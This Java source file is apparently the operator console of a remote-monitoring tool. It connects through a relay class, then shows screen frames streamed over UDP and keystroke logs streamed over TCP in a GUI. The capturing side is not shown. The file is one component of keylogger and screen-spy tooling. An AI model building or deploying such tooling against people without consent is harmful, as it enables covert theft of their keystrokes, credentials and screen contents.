package controller;

import model.connection.HalfManClient;
import model.connection.TCPClient;
import model.connection.UDPClient;
import view.ClientGUI;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.DatagramPacket;

import static java.lang.Thread.sleep;

public class ClientController {



    // For receiving the KeyLog.
    private TCPClient TCPClient;
    // For receiving ScreenShare.
    private UDPClient UDPClient;
    // ClientGUI
    private ClientGUI GUI;
    // For starting connection.
    private boolean IsConnected;



    // Constructor.
    public ClientController() throws IOException {
        GUI = new ClientGUI();
        IsConnected = false;
        stablishConnection();
    }



    // Tries to stablish connection to server.
    private void stablishConnection() throws IOException {
        HalfManClient.sendClientIP();

        while(!IsConnected) {
                IsConnected = HalfManClient.hasLink();
                System.out.println("Link state : " + IsConnected);

                if (IsConnected) {
                    TCPClient = new TCPClient();
                    UDPClient = new UDPClient();
                }
        }
    }

    // Startup of the GUI.
    public void run() {
        Thread runScreenReceptor = screenReceptor();
        Thread runLoggerReceptor = logReceptor();

        runScreenReceptor.start();
        runLoggerReceptor.start();
    }

    private Thread screenReceptor() {
        return new Thread(() -> {
            while (true) {
                try {
                    byte[] imageBytes = new byte[65536];
                    DatagramPacket imagePacket = new DatagramPacket(imageBytes,
                            imageBytes.length);

                    UDPClient.recieve(imagePacket);
                    byte[] imageData = imagePacket.getData();

                    ByteArrayInputStream inputStream = new ByteArrayInputStream(imageData);
                    BufferedImage image = ImageIO.read(inputStream);

                    Image scaledImage = image.getScaledInstance(720, 480,
                            Image.SCALE_SMOOTH);
                    ImageIcon icon = new ImageIcon(scaledImage);
                    GUI.getVideoLabel().setIcon(icon);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        });
    }
    private Thread logReceptor() {
        return new Thread(() -> {
            GUI.getLoggerDescription().setText("[Comienza el log]");
            while (true) {
                try {
                    GUI.getLoggerDescription().setText(
                            GUI.getLoggerDescription().getText() +
                                    "\n>" +
                                    TCPClient.recieveMessage());
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        });
    }

}
